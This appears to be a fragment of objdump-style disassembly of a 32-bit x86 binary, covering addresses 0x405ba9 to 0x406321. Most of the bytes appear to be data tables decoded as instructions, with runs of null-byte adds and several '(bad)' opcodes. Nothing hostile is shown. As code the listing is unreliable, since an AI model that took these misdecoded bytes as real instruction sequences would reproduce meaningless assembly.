  405ba9:	add    BYTE PTR [edx+edi*1+0x0],ah
  405bad:	add    BYTE PTR [eax],al
  405baf:	add    BYTE PTR [ebx+0x7c071e08],dl
  405bb5:	add    DWORD PTR [esi+0x0],eax
  405bb8:	jp     0x405bf4
  405bba:	add    BYTE PTR [eax],al
  405bbc:	add    BYTE PTR [eax],al
  405bbe:	xchg   ebx,eax
  405bbf:	or     BYTE PTR [ecx],dh
  405bc1:	pop    es
  405bc2:	jl     0x405bc5
  405bc4:	inc    esi
  405bc5:	add    BYTE PTR [eax+0x3a],dl
  405bcb:	add    BYTE PTR [ebx+0x7c074a08],dl
  405bd1:	add    DWORD PTR [esi+0x0],eax
  405bd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bd5:	cmp    al,BYTE PTR [eax]
  405bd7:	add    BYTE PTR [eax],al
  405bd9:	add    BYTE PTR [ebx+0x7c075908],dl
  405bdf:	add    DWORD PTR [esi+0x0],eax
  405be2:	mov    esp,0x3a
  405be7:	add    BYTE PTR [ebx+0x7c077108],dl
  405bed:	add    DWORD PTR [esi+0x0],eax
  405bf0:	sar    BYTE PTR [edx],cl
  405bf2:	add    BYTE PTR [eax],al
  405bf4:	add    BYTE PTR [eax],al
  405bf6:	xchg   ebx,eax
  405bf7:	or     BYTE PTR [ebx+0x46017c07],al
  405bfd:	add    al,ch
  405bff:	cmp    al,BYTE PTR [eax]
  405c01:	add    BYTE PTR [eax],al
  405c03:	add    BYTE PTR [ebx+0x7c079708],dl
  405c09:	add    DWORD PTR [esi+0x0],eax
  405c0c:	(bad)  
  405c0d:	cmp    al,BYTE PTR [eax]
  405c0f:	add    BYTE PTR [eax],al
  405c11:	add    BYTE PTR [ebx+0x7c07ac08],dl
  405c17:	add    DWORD PTR [esi+0x0],eax
  405c1a:	adc    al,0x3b
  405c1c:	add    BYTE PTR [eax],al
  405c1e:	add    BYTE PTR [eax],al
  405c20:	xchg   ebx,eax
  405c21:	or     dl,al
  405c23:	pop    es
  405c24:	jl     0x405c27
  405c26:	inc    esi
  405c27:	add    BYTE PTR [edx],ch
  405c29:	cmp    eax,DWORD PTR [eax]
  405c2b:	add    BYTE PTR [eax],al
  405c2d:	add    BYTE PTR [ebx+0x7c07d808],dl
  405c33:	add    DWORD PTR [esi+0x0],eax
  405c36:	inc    eax
  405c37:	cmp    eax,DWORD PTR [eax]
  405c39:	add    BYTE PTR [eax],al
  405c3b:	add    BYTE PTR [ebx+0x7c07ee08],dl
  405c41:	add    DWORD PTR [esi+0x0],eax
  405c44:	push   esi
  405c45:	cmp    eax,DWORD PTR [eax]
  405c47:	add    BYTE PTR [eax],al
  405c49:	add    BYTE PTR [ebx+0x7c080008],dl
  405c4f:	add    DWORD PTR [esi+0x0],eax
  405c52:	ins    BYTE PTR es:[edi],dx
  405c53:	cmp    eax,DWORD PTR [eax]
  405c55:	add    BYTE PTR [eax],al
  405c57:	add    BYTE PTR [ebx+0x7c081208],dl
  405c5d:	add    DWORD PTR [esi+0x0],eax
  405c60:	cmp    BYTE PTR [ebx],0x0
  405c63:	add    BYTE PTR [eax],al
  405c65:	add    BYTE PTR [ebx+0x7c082408],dl
  405c6b:	add    DWORD PTR [esi+0x0],eax
  405c6e:	cwde   
  405c6f:	cmp    eax,DWORD PTR [eax]
  405c71:	add    BYTE PTR [eax],al
  405c73:	add    BYTE PTR [ebx+0x7c083908],dl
  405c79:	add    DWORD PTR [esi+0x0],eax
  405c7c:	scas   al,BYTE PTR es:[edi]
  405c7d:	cmp    eax,DWORD PTR [eax]
  405c7f:	add    BYTE PTR [eax],al
  405c81:	add    BYTE PTR [ebx+0x7c084e08],dl
  405c87:	add    DWORD PTR [esi+0x0],eax
  405c8a:	les    edi,FWORD PTR [ebx]
  405c8c:	add    BYTE PTR [eax],al
  405c8e:	add    BYTE PTR [eax],al
  405c90:	xchg   ebx,eax
  405c91:	or     BYTE PTR [ebx+0x8],ah
  405c94:	jl     0x405c97
  405c96:	inc    esi
  405c97:	add    dl,bl
  405c99:	cmp    eax,DWORD PTR [eax]
  405c9b:	add    BYTE PTR [eax],al
  405c9d:	add    BYTE PTR [ebx+0x7c087808],dl
  405ca3:	add    DWORD PTR [esi+0x0],eax
  405ca6:	lock cmp eax,DWORD PTR [eax]
  405ca9:	add    BYTE PTR [eax],al
  405cab:	add    BYTE PTR [ebx+0x7c088d08],dl
  405cb1:	add    DWORD PTR [esi+0x0],eax
  405cb4:	push   es
  405cb5:	cmp    al,0x0
  405cb7:	add    BYTE PTR [eax],al
  405cb9:	add    BYTE PTR [ebx+0x7c08a208],dl
  405cbf:	add    DWORD PTR [esi+0x0],eax
  405cc2:	sbb    al,0x3c
  405cc4:	add    BYTE PTR [eax],al
  405cc6:	add    BYTE PTR [eax],al
  405cc8:	xchg   ebx,eax
  405cc9:	or     BYTE PTR [edi+0x46017c08],dh
  405ccf:	add    BYTE PTR [edx],dh
  405cd1:	cmp    al,0x0
  405cd3:	add    BYTE PTR [eax],al
  405cd5:	add    BYTE PTR [ebx+0x7c08cc08],dl
  405cdb:	add    DWORD PTR [esi+0x0],eax
  405cde:	dec    eax
  405cdf:	cmp    al,0x0
  405ce1:	add    BYTE PTR [eax],al
  405ce3:	add    BYTE PTR [ebx+0x7c08e108],dl
  405ce9:	add    DWORD PTR [esi+0x0],eax
  405cec:	pop    esi
  405ced:	cmp    al,0x0
  405cef:	add    BYTE PTR [eax],al
  405cf1:	add    BYTE PTR [ebx+0x7c08f608],dl
  405cf7:	add    DWORD PTR [esi+0x0],eax
  405cfa:	je     0x405d38
  405cfc:	add    BYTE PTR [eax],al
  405cfe:	add    BYTE PTR [eax],al
  405d00:	xchg   ebx,eax
  405d01:	or     BYTE PTR [ebx],cl
  405d03:	or     DWORD PTR [ecx+eax*1+0x46],edi
  405d07:	add    BYTE PTR [edx+0x3c],cl
  405d0d:	add    BYTE PTR [ebx+0x7c092008],dl
  405d13:	add    DWORD PTR [esi+0x0],eax
  405d16:	mov    al,ds:0x3c
  405d1b:	add    BYTE PTR [ebx+0x7c093508],dl
  405d21:	add    DWORD PTR [esi+0x0],eax
  405d24:	mov    dh,0x3c
  405d26:	add    BYTE PTR [eax],al
  405d28:	add    BYTE PTR [eax],al
  405d2a:	xchg   ebx,eax
  405d2b:	or     BYTE PTR [edx+0x9],cl
  405d2e:	jl     0x405d31
  405d30:	inc    esi
  405d31:	add    ah,cl
  405d33:	cmp    al,0x0
  405d35:	add    BYTE PTR [eax],al
  405d37:	add    BYTE PTR [ebx+0x7c095f08],dl
  405d3d:	add    DWORD PTR [esi+0x0],eax
  405d40:	loop   0x405d7e
  405d42:	add    BYTE PTR [eax],al
  405d44:	add    BYTE PTR [eax],al
  405d46:	xchg   ebx,eax
  405d47:	or     BYTE PTR [ecx+ecx*1+0x7c],dh
  405d4b:	add    DWORD PTR [esi+0x0],eax
  405d4e:	clc    
  405d4f:	cmp    al,0x0
  405d51:	add    BYTE PTR [eax],al
  405d53:	add    BYTE PTR [ebx+0x7c098908],dl
  405d59:	add    DWORD PTR [esi+0x0],eax
  405d5c:	push   cs
  405d5d:	cmp    eax,0x0
  405d62:	xchg   ebx,eax
  405d63:	or     BYTE PTR [esi+0x46017c09],bl
  405d69:	add    BYTE PTR [edi*1+0x0],ah
  405d70:	xchg   ebx,eax
  405d71:	or     BYTE PTR [eax+0x46017c09],dh
  405d77:	add    BYTE PTR [edx],bh
  405d79:	cmp    eax,0x0
  405d7e:	xchg   ebx,eax
  405d7f:	or     dl,al
  405d81:	or     DWORD PTR [ecx+eax*1+0x46],edi
  405d85:	add    BYTE PTR [eax+0x3d],dl
  405d88:	add    BYTE PTR [eax],al
  405d8a:	add    BYTE PTR [eax],al
  405d8c:	xchg   ebx,eax
  405d8d:	or     ah,dl
  405d8f:	or     DWORD PTR [ecx+eax*1+0x46],edi
  405d93:	add    BYTE PTR [esi+0x3d],ah
  405d96:	add    BYTE PTR [eax],al
  405d98:	add    BYTE PTR [eax],al
  405d9a:	xchg   ebx,eax
  405d9b:	or     dh,ah
  405d9d:	or     DWORD PTR [ecx+eax*1+0x46],edi
  405da1:	add    BYTE PTR [ebp+edi*1+0x0],bh
  405da5:	add    BYTE PTR [eax],al
  405da7:	add    BYTE PTR [ecx-0x71f38800],dl
  405dad:	add    DWORD PTR [esi+0x0],eax
  405db0:	and    BYTE PTR [edi],bh
  405db2:	add    BYTE PTR [eax],al
  405db4:	add    BYTE PTR [eax],al
  405db6:	xchg   ecx,eax
  405db7:	add    BYTE PTR [ebp+0xc],bh
  405dba:	xchg   esp,eax
  405dbb:	add    DWORD PTR [edi+0x0],eax
  405dbe:	or     al,0x41
  405dc0:	add    BYTE PTR [eax],al
  405dc2:	add    BYTE PTR [eax],al
  405dc4:	xchg   ecx,eax
  405dc5:	add    BYTE PTR [ecx+0x4701980c],cl
  405dcb:	add    BYTE PTR [ebx+esi*1+0x0],cl
  405dcf:	add    BYTE PTR [eax],al
  405dd1:	add    cl,ah
  405dd3:	add    DWORD PTR [ebx],esi
  405dd5:	sbb    DWORD PTR [ebp+0x5],esi
  405dd8:	dec    edi
  405dd9:	add    BYTE PTR [ebx+0x33],bl
  405ddf:	add    cl,ah
  405de1:	add    DWORD PTR [eax+0x4f057f19],ecx
  405de7:	add    BYTE PTR [ebx+esi*1+0x0],ah
  405dee:	loope  0x405df1
  405df0:	mov    edx,0x4f013e10
  405df5:	add    BYTE PTR [esp+esi*1+0x0],cl
  405dfc:	loope  0x405e07
  405dfe:	ret    0x8919
  405e01:	add    eax,0x3494004f
  405e06:	add    BYTE PTR [eax],al
  405e08:	add    BYTE PTR [eax],al
  405e0a:	loope  0x405e0d
  405e0c:	adc    eax,0x4f00211a
  405e11:	add    BYTE PTR [esp+esi*1+0x0],bl
  405e18:	loope  0x405e1b
  405e1a:	inc    eax
  405e1b:	sbb    ah,BYTE PTR [ecx]
  405e1d:	add    BYTE PTR [edi+0x0],cl
  405e20:	(bad)  
  405e21:	xor    al,0x0
  405e23:	add    BYTE PTR [eax],al
  405e25:	add    cl,ah
  405e27:	or     DWORD PTR [ebx+0x1a],edi
  405e2a:	xchg   ecx,eax
  405e2b:	add    eax,0x34cf004f
  405e30:	add    BYTE PTR [eax],al
  405e32:	add    BYTE PTR [eax],al
  405e34:	xchg   BYTE PTR [eax],bl
  405e36:	or     al,BYTE PTR [ecx]
  405e38:	lds    eax,FWORD PTR [ecx]
  405e3a:	dec    edi
  405e3b:	add    cl,ch
  405e3d:	xor    al,0x0
  405e3f:	add    BYTE PTR [eax],al
  405e41:	add    BYTE PTR [ecx+0x211aca00],al
  405e47:	add    BYTE PTR [eax+0x0],dl
  405e4a:	sbb    BYTE PTR ds:0x0,dh
  405e50:	loope  0x405e53
  405e52:	out    0x1b,al
  405e54:	rol    DWORD PTR ds:0x35670050,0x0
  405e5b:	add    BYTE PTR [eax],al
  405e5d:	add    cl,ah
  405e5f:	add    DWORD PTR [eax+0x50057f19],ecx
  405e65:	add    BYTE PTR [eax+0x35],dh
  405e68:	add    BYTE PTR [eax],al
  405e6a:	add    BYTE PTR [eax],al
  405e6c:	loope  0x405e6f
  405e6e:	mov    edx,0x50013e10
  405e73:	add    BYTE PTR [eax+0x36],bl
  405e76:	add    BYTE PTR [eax],al
  405e78:	add    BYTE PTR [eax],al
  405e7a:	loope  0x405e85
  405e7c:	cmp    BYTE PTR [edi+ecx*8],bl
  405e7f:	add    eax,0x36600050
  405e84:	add    BYTE PTR [eax],al
  405e86:	add    BYTE PTR [eax],al
  405e88:	loope  0x405e8b
  405e8a:	adc    eax,0x5000211a
  405e8f:	add    BYTE PTR [eax+0x36],ch
  405e92:	add    BYTE PTR [eax],al
  405e94:	add    BYTE PTR [eax],al
  405e96:	loope  0x405e99
  405e98:	inc    eax
  405e99:	sbb    ah,BYTE PTR [ecx]
  405e9b:	add    BYTE PTR [eax+0x0],dl
  405e9e:	xchg   ebx,eax
  405e9f:	add    BYTE PTR ss:[eax],al
  405ea2:	add    BYTE PTR [eax],al
  405ea4:	loope  0x405eaf
  405ea6:	jnp    0x405ec2
  405ea8:	xchg   ecx,eax
  405ea9:	add    eax,0x369b0050
  405eae:	add    BYTE PTR [eax],al
  405eb0:	add    BYTE PTR [eax],al
  405eb2:	xchg   BYTE PTR [eax],bl
  405eb4:	or     al,BYTE PTR [ecx]
  405eb6:	lds    eax,FWORD PTR [ecx]
  405eb8:	push   eax
  405eb9:	add    BYTE PTR [ebp+0x36],dh
  405ebf:	add    BYTE PTR [ecx+0x211c9400],al
  405ec5:	add    BYTE PTR [ecx+0x0],dl
  405ec8:	add    BYTE PTR [eax],al
  405eca:	add    DWORD PTR [eax],eax
  405ecc:	xchg   ebp,eax
  405ecd:	or     al,0x0
  405ecf:	add    BYTE PTR [ecx],al
  405ed1:	add    cl,cl
  405ed3:	add    al,0x0
  405ed5:	add    BYTE PTR [edx],al
  405ed7:	add    bh,cl
  405ed9:	add    al,0x0
  405edb:	add    BYTE PTR [ecx],al
  405edd:	add    BYTE PTR [ebp+0x100000c],bl
  405ee3:	add    BYTE PTR [esp+ecx*1+0x10000],ah
  405eea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eeb:	or     al,0x0
  405eed:	add    BYTE PTR [edx],al
  405eef:	add    BYTE PTR [ebx+0x100000c],ch
  405ef5:	add    BYTE PTR [esp+ecx*1+0x20000],ah
  405efc:	mov    cl,0xc
  405efe:	add    BYTE PTR [eax],al
  405f00:	add    DWORD PTR [eax],eax
  405f02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f03:	or     al,0x0
  405f05:	add    BYTE PTR [edx],al
  405f07:	add    BYTE PTR [ecx+0x300000c],dh
  405f0d:	add    BYTE PTR [esi+0x100000c],dh
  405f13:	add    BYTE PTR [edi+0x200000c],ah
  405f19:	add    ah,al
  405f1b:	or     al,0x0
  405f1d:	add    BYTE PTR [ebx],al
  405f1f:	add    cl,cl
  405f21:	or     al,0x0
  405f23:	add    BYTE PTR [eax+eax*1],al
  405f26:	(bad)  
  405f27:	or     al,0x0
  405f29:	add    BYTE PTR ds:0xce300,al
  405f2f:	add    BYTE PTR [esi],al
  405f31:	add    al,dh
  405f33:	or     al,0x0
  405f35:	add    BYTE PTR [ecx],al
  405f37:	add    BYTE PTR [edi+0x200000c],ah
  405f3d:	add    ah,al
  405f3f:	or     al,0x0
  405f41:	add    BYTE PTR [ebx],al
  405f43:	add    BYTE PTR [ebp+0x100000c],bl
  405f49:	add    BYTE PTR [edi+0x200000c],ah
  405f4f:	add    ah,al
  405f51:	or     al,0x0
  405f53:	add    BYTE PTR [ebx],al
  405f55:	add    BYTE PTR [ebx+0x100000c],ch
  405f5b:	add    cl,bh
  405f5d:	or     al,0x0
  405f5f:	add    BYTE PTR [edx],al
  405f61:	add    bh,bh
  405f63:	or     al,0x0
  405f65:	add    BYTE PTR [ecx],al
  405f67:	add    BYTE PTR [edi],cl
  405f69:	or     eax,0x10000
  405f6e:	sbb    DWORD PTR ds:0x20000,ecx
  405f74:	push   ds
  405f75:	or     eax,0x30000
  405f7a:	and    ecx,DWORD PTR ds:0x10000
  405f80:	sbb    DWORD PTR ds:0x20000,ecx
  405f86:	push   ds
  405f87:	or     eax,0x30000
  405f8c:	and    ecx,DWORD PTR ds:0x10000
  405f92:	sub    ecx,DWORD PTR ds:0x10000
  405f98:	leave  
  405f99:	add    al,0x0
  405f9b:	add    BYTE PTR [ecx],al
  405f9d:	add    cl,cl
  405f9f:	add    al,0x0
  405fa1:	add    BYTE PTR [edx],al
  405fa3:	add    bh,cl
  405fa5:	add    al,0x0
  405fa7:	add    BYTE PTR [ecx],al
  405fa9:	add    BYTE PTR [ebp+0x100000c],bl
  405faf:	add    BYTE PTR [ebp+0x100000c],dl
  405fb5:	add    BYTE PTR [ecx*1+0x10000],dh
  405fbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fbd:	or     al,0x0
  405fbf:	add    BYTE PTR [edx],al
  405fc1:	add    BYTE PTR [ecx*1+0x30000],dh
  405fc8:	in     al,dx
  405fc9:	add    al,0x0
  405fcb:	add    BYTE PTR [eax+eax*1],al
  405fce:	stc    
  405fcf:	add    al,0x0
  405fd1:	add    BYTE PTR [ecx],al
  405fd3:	add    BYTE PTR [edi],dh
  405fd5:	or     eax,0x10000
  405fda:	sub    ecx,DWORD PTR ds:0x20000
  405fe0:	prefetch BYTE PTR [eax]
  405fe3:	add    BYTE PTR [ebx],al
  405fe5:	add    BYTE PTR [eax+0xd],al
  405fe8:	add    BYTE PTR [eax],al
  405fea:	add    DWORD PTR [eax],eax
  405fec:	prefetch BYTE PTR [eax]
  405fef:	add    BYTE PTR [ecx],al
  405ff1:	add    BYTE PTR [edi],dh
  405ff3:	or     eax,0x10000
  405ff8:	aaa    
  405ff9:	or     eax,0x10000
  405ffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fff:	or     al,0x0
  406001:	add    BYTE PTR [ecx],al
  406003:	add    cl,cl
  406005:	add    al,0x0
  406007:	add    BYTE PTR [ecx],al
  406009:	add    BYTE PTR [edx+0xd],cl
  40600c:	add    BYTE PTR [eax],al
  40600e:	add    al,BYTE PTR [eax]
  406010:	push   edi
  406011:	or     eax,0x10000
  406016:	dec    edx
  406017:	or     eax,0x20000
  40601c:	push   edi
  40601d:	or     eax,0x10000
  406022:	jo     0x406031
  406024:	add    BYTE PTR [eax],al
  406026:	add    al,BYTE PTR [eax]
  406028:	je     0x406037
  40602a:	add    BYTE PTR [eax],al
  40602c:	add    eax,DWORD PTR [eax]
  40602e:	js     0x40603d
  406030:	add    BYTE PTR [eax],al
  406032:	add    al,0x0
  406034:	pop    es
  406035:	add    eax,0x10000
  40603a:	leave  
  40603b:	add    al,0x0
  40603d:	add    BYTE PTR [ecx],al
  40603f:	add    BYTE PTR [esi+0xd],bh
  406042:	add    BYTE PTR [eax],al
  406044:	add    DWORD PTR [eax],eax
  406046:	jle    0x406055
  406048:	add    BYTE PTR [eax],al
  40604a:	add    DWORD PTR [eax],eax
  40604c:	jle    0x40605b
  40604e:	add    BYTE PTR [eax],al
  406050:	add    DWORD PTR [eax],eax
  406052:	jle    0x406061
  406054:	add    BYTE PTR [eax],al
  406056:	add    DWORD PTR [eax],eax
  406058:	jle    0x406067
  40605a:	add    BYTE PTR [eax],al
  40605c:	add    DWORD PTR [eax],eax
  40605e:	jle    0x40606d
  406060:	add    BYTE PTR [eax],al
  406062:	add    DWORD PTR [eax],eax
  406064:	jle    0x406073
  406066:	add    BYTE PTR [eax],al
  406068:	add    DWORD PTR [eax],eax
  40606a:	push   edi
  40606b:	or     eax,0x10000
  406070:	push   edi
  406071:	or     eax,0x20000
  406076:	test   BYTE PTR ds:0x30000,cl
  40607c:	nop
  40607d:	or     eax,0x40000
  406082:	fld    DWORD PTR [eax+eax*1]
  406085:	add    BYTE PTR ds:0x4e300,al
  40608b:	add    BYTE PTR [esi],al
  40608d:	add    ah,ch
  40608f:	add    al,0x0
  406091:	add    BYTE PTR [edi],al
  406093:	add    cl,bh
  406095:	add    al,0x0
  406097:	add    BYTE PTR [eax],cl
  406099:	add    BYTE PTR [edi],al
  40609b:	add    eax,0x10000
  4060a0:	pop    ebx
  4060a1:	sbb    al,BYTE PTR [eax]
  4060a3:	add    BYTE PTR [ecx],al
  4060a5:	add    BYTE PTR [ebx+0x1a],bl
  4060a8:	push   es
  4060a9:	add    BYTE PTR [esi],ah
  4060ab:	add    BYTE PTR [esi],al
  4060ad:	add    BYTE PTR [ecx+0x2a000601],dh
  4060b3:	add    BYTE PTR [esi],al
  4060b5:	add    BYTE PTR [ebp-0x3afff9ff],ah
  4060bb:	add    BYTE PTR [edi],al
  4060bd:	add    BYTE PTR [esi],ch
  4060bf:	add    BYTE PTR [edi],al
  4060c1:	add    BYTE PTR [ecx+0x32000701],dh
  4060c7:	add    BYTE PTR [edi],al
  4060c9:	add    BYTE PTR [ebp-0x3afff8ff],ah
  4060cf:	add    cl,al
  4060d1:	add    BYTE PTR [edx],cl
  4060d3:	add    DWORD PTR [ecx],esp
  4060d5:	add    cl,cl
  4060d7:	add    BYTE PTR [edx],cl
  4060d9:	add    DWORD PTR [edx+0x1],eax
  4060dc:	rol    DWORD PTR [eax],1
  4060de:	or     al,BYTE PTR [ecx]
  4060e0:	inc    edx
  4060e1:	add    ecx,ebx
  4060e3:	add    BYTE PTR [edx],cl
  4060e5:	add    DWORD PTR [ecx],edi
  4060e7:	add    ecx,esp
  4060e9:	add    BYTE PTR [edx],cl
  4060eb:	add    DWORD PTR [ecx],edi
  4060ed:	add    ecx,ebp
  4060ef:	add    BYTE PTR [edx],cl
  4060f1:	add    DWORD PTR [ecx],edi
  4060f3:	add    ecx,esi
  4060f5:	add    BYTE PTR [edx],cl
  4060f7:	add    DWORD PTR [ecx],edi
  4060f9:	add    ecx,edi
  4060fb:	add    BYTE PTR [edx],cl
  4060fd:	add    DWORD PTR [ecx],edi
  4060ff:	add    DWORD PTR [ecx],eax
  406101:	add    DWORD PTR [edx],ecx
  406103:	add    DWORD PTR [ecx],edi
  406105:	add    DWORD PTR [ecx],ecx
  406107:	add    DWORD PTR [edx],ecx
  406109:	add    DWORD PTR [ecx],edi
  40610b:	add    DWORD PTR [ecx],edx
  40610d:	add    DWORD PTR [edx],ecx
  40610f:	add    DWORD PTR [ecx],edi
  406111:	add    DWORD PTR [ecx],ebx
  406113:	add    DWORD PTR [edx],ecx
  406115:	add    DWORD PTR [ecx],edi
  406117:	add    DWORD PTR [ecx],esp
  406119:	add    DWORD PTR [edx],ecx
  40611b:	add    DWORD PTR [ecx],edi
  40611d:	add    DWORD PTR [ecx],ebp
  40611f:	add    DWORD PTR [edx],ecx
  406121:	add    DWORD PTR [ecx],edi
  406123:	add    DWORD PTR [ecx],esi
  406125:	add    DWORD PTR [edx],ecx
  406127:	add    DWORD PTR [edx+0x1],eax
  40612a:	cmp    DWORD PTR [ecx],eax
  40612c:	or     al,BYTE PTR [ecx]
  40612e:	cmp    DWORD PTR [ecx],eax
  406130:	inc    ecx
  406131:	add    DWORD PTR [edx],ecx
  406133:	add    DWORD PTR [ecx+0xa014901],esi
  406139:	add    DWORD PTR [ecx],esp
  40613b:	add    BYTE PTR [ecx+0x1],dl
  40613e:	or     al,BYTE PTR [ecx]
  406140:	mov    bh,0x1
  406142:	popa   
  406143:	add    DWORD PTR [edx],ecx
  406145:	add    DWORD PTR [esi+0xa017101],edi
  40614b:	add    ebp,eax
  40614d:	add    DWORD PTR [ecx],ecx
  40614f:	add    BYTE PTR [edx],cl
  406151:	add    DWORD PTR [ecx],esp
  406153:	add    BYTE PTR [ecx],dh
  406155:	add    BYTE PTR [eax+edx*1+0x35],dl
  406159:	add    DWORD PTR [eax+eax*1],ecx
  40615c:	or     al,BYTE PTR [ecx]
  40615e:	and    DWORD PTR [eax],eax
  406160:	test   eax,0x21010a00
  406165:	add    BYTE PTR [ecx+0x72107900],ch
  40616b:	add    bh,BYTE PTR [ecx+0x1]
  40616e:	mov    BYTE PTR [eax],dl
  406170:	js     0x406174
  406172:	adc    al,0x0
  406174:	xchg   edi,eax
  406175:	adc    BYTE PTR [ebp-0x5affe3fe],al
  40617b:	adc    BYTE PTR [edi-0x4effc6fe],dl
  406181:	adc    BYTE PTR ds:0xba001c01,dh
  406187:	adc    BYTE PTR [esi],bh
  406189:	add    DWORD PTR [ecx+0x2110cf01],ecx
  40618f:	add    BYTE PTR [eax+eax*1],ah
  406192:	xchg   edi,eax
  406193:	adc    BYTE PTR [ebp-0x5affd3fe],al
  406199:	adc    BYTE PTR [edi-0x45ffd3fe],dl
  40619f:	adc    BYTE PTR [esi],bh
  4061a1:	add    DWORD PTR [eax+eax*1],edx
  4061a4:	or     al,BYTE PTR [ecx]
  4061a6:	and    DWORD PTR [eax],eax
  4061a8:	or     al,0x0
  4061aa:	xlat   BYTE PTR ds:[ebx]
  4061ab:	adc    ah,bl
  4061ad:	add    cl,BYTE PTR [eax+eax*1]
  4061b0:	xchg   edi,eax
  4061b1:	adc    BYTE PTR [ebp-0x5affcbfe],al
  4061b7:	adc    BYTE PTR [edi-0x12ffcefe],dl
  4061bd:	adc    bh,ah
  4061bf:	add    bh,BYTE PTR [eax+eax*1]
  4061c2:	or     al,BYTE PTR [ecx]
  4061c4:	std    
  4061c5:	add    ah,BYTE PTR [ecx+0x3110901]
  4061cb:	add    edx,DWORD PTR [eax+eax*1]
  4061ce:	adc    al,0x11
  4061d0:	sbb    eax,0xba003403
  4061d5:	adc    BYTE PTR [esi],bh
  4061d7:	add    DWORD PTR [ecx],esi
  4061d9:	add    BYTE PTR ds:0xa9032711,bl
  4061df:	add    DWORD PTR [ebx],esi
  4061e1:	adc    DWORD PTR [esi],edi
  4061e3:	add    DWORD PTR [eax+eax*1],edx
  4061e6:	mov    BYTE PTR [eax],dl
  4061e8:	das    
  4061e9:	add    ebp,DWORD PTR [ecx]
  4061eb:	add    BYTE PTR [ebp+0x11],al
  4061ee:	push   esp
  4061ef:	add    edi,DWORD PTR [ecx+0x71115100]
  4061f5:	add    DWORD PTR [ecx+0x5c117d01],esi
  4061fb:	add    eax,ecx
  4061fd:	add    DWORD PTR [edx],ecx
  4061ff:	add    DWORD PTR [ecx-0x4bffbeff],esi
  406205:	adc    DWORD PTR [edi+0x3],ebp
  406208:	xor    DWORD PTR [eax],eax
  40620a:	fcom   DWORD PTR [ecx]
  40620c:	jne    0x406211
  40620e:	xor    DWORD PTR [eax],eax
  406210:	jmp    0xa01:0xe1013511
  406217:	add    DWORD PTR [ecx],edi
  406219:	add    ecx,ecx
  40621b:	add    DWORD PTR [eax+0x59037d10],ecx
  406221:	add    BYTE PTR [edx],cl
  406223:	add    DWORD PTR [ecx],esp
  406225:	add    BYTE PTR [ecx],dl
  406227:	add    cl,BYTE PTR [edi+0x13]
  40622a:	lea    eax,[ebx]
  40622c:	dec    ecx
  40622d:	add    BYTE PTR [edi+0x13],dh
  406230:	xchg   esp,eax
  406231:	add    esp,DWORD PTR [ecx]
  406233:	add    cl,BYTE PTR [eax+0x49039a10]
  406239:	add    BYTE PTR [edx],cl
  40623b:	add    DWORD PTR [ecx],esp
  40623d:	add    BYTE PTR [ecx],dl
  40623f:	add    al,BYTE PTR [ebx+0x49013913]
  406245:	add    BYTE PTR [ebx+0x4903a613],bl
  40624b:	add    BYTE PTR [esi+0x49014213],ch
  406251:	add    al,bl
  406253:	adc    ebp,DWORD PTR [ebp-0x77fdcefd]
  406259:	adc    BYTE PTR [ecx],bh
  40625b:	add    DWORD PTR [ecx-0x4cec19ff],ebp
  406261:	add    esi,DWORD PTR [ecx+0x0]
  406264:	mov    cl,0x10
  406266:	xor    eax,0xf4007101
  40626b:	adc    esi,DWORD PTR [eax]
  40626d:	add    DWORD PTR [ecx],esi
  40626f:	add    BYTE PTR [esi],al
  406271:	adc    al,0x3e
  406273:	add    DWORD PTR [ecx],esi
  406275:	add    BYTE PTR [edx],dl
  406277:	adc    al,0x30
  406279:	add    DWORD PTR [ecx],edx
  40627b:	add    dh,BYTE PTR [ecx+0x51013510]
  406281:	add    BYTE PTR [ecx],bh
  406283:	adc    al,0xb9
  406285:	add    edi,DWORD PTR [ecx]
  406287:	add    cl,BYTE PTR [eax+0x4103bf10]
  40628d:	add    cl,BYTE PTR [edx]
  40628f:	add    DWORD PTR [ecx],esp
  406291:	add    BYTE PTR [ecx+0x2],cl
  406294:	or     al,BYTE PTR [ecx]
  406296:	lds    eax,FWORD PTR [ebx]
  406298:	push   ecx
  406299:	add    cl,BYTE PTR [edx]
  40629b:	add    esp,ecx
  40629d:	add    ebx,DWORD PTR [ecx+0x2]
  4062a0:	or     al,BYTE PTR [ecx]
  4062a2:	rol    DWORD PTR [ebx],1
  4062a4:	popa   
  4062a5:	add    cl,BYTE PTR [edx]
  4062a7:	add    edx,ebx
  4062a9:	add    ebp,DWORD PTR [ecx+0x2]
  4062ac:	or     al,BYTE PTR [ecx]
  4062ae:	loop   0x4062b3
  4062b0:	inc    ecx
  4062b1:	add    bh,dh
  4062b3:	adc    al,0xea
  4062b5:	add    esi,DWORD PTR [ecx+0x2]
  4062b8:	mov    BYTE PTR [eax],dl
  4062ba:	lock add ebp,DWORD PTR [ecx]
  4062bd:	add    BYTE PTR [ecx],al
  4062bf:	adc    eax,0x31040e
  4062c4:	sbb    dl,BYTE PTR ds:0x510413
  4062ca:	or     al,BYTE PTR [ecx]
  4062cc:	and    DWORD PTR [eax],eax
  4062ce:	push   ecx
  4062cf:	add    BYTE PTR [ebp+0x15],dl
  4062d2:	and    DWORD PTR [ecx+edx*4],eax
  4062d5:	add    cl,BYTE PTR [edx]
  4062d7:	add    DWORD PTR [edi],esp
  4062d9:	add    al,0x81
  4062db:	add    cl,BYTE PTR [eax-0x66fbd1f0]
  4062e1:	add    cl,BYTE PTR [edx]
  4062e3:	add    DWORD PTR [ecx],esp
  4062e5:	add    BYTE PTR [ecx+0x21010a00],al
  4062eb:	add    BYTE PTR [ecx+0x2a010a02],ah
  4062f1:	add    DWORD PTR [ecx+0x3a15bf00],eax
  4062f7:	add    al,0x11
  4062f9:	add    ch,bl
  4062fb:	adc    eax,0x2a10441
  406300:	or     al,BYTE PTR [ecx]
  406302:	cmp    DWORD PTR [ecx],eax
  406304:	mov    ecx,0x47010a02
  406309:	add    al,0xc9
  40630b:	add    cl,BYTE PTR [edx]
  40630d:	add    DWORD PTR [ebp+0x4],ecx
  406310:	test   eax,0x58108802
  406315:	add    al,0xd9
  406317:	add    cl,BYTE PTR [edx]
  406319:	add    DWORD PTR [ecx],edi
  40631b:	add    DWORD PTR [ecx-0x46e97a00],eax
  406321:	add    esp,ecx
